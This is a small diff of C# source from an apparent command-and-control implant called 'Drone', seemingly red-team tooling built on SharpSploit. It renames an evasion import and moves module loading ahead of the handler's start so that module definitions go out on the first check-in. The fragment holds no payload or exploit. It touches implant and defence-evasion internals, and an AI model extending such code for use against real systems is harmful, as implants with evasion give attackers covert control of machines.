@@ -5,8 +5,8 @@ using System.Reflection;
 using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
+using Drone.Evasion;
 
-using Drone.SharpSploit.Evasion;
 using Drone.Invocation.DynamicInvoke;
 using Drone.Handlers;
 using Drone.Models;
@@ -40,10 +40,11 @@ namespace Drone
 
             _handler = GetHandler;
             _handler.Init(_config, _metadata);
+            
+            // do this first so the module definitions are read to send on first check-in
+            LoadDefaultModules();
 
             var t = _handler.Start();
-
-            LoadDefaultModules();
 
             _running = true;
 
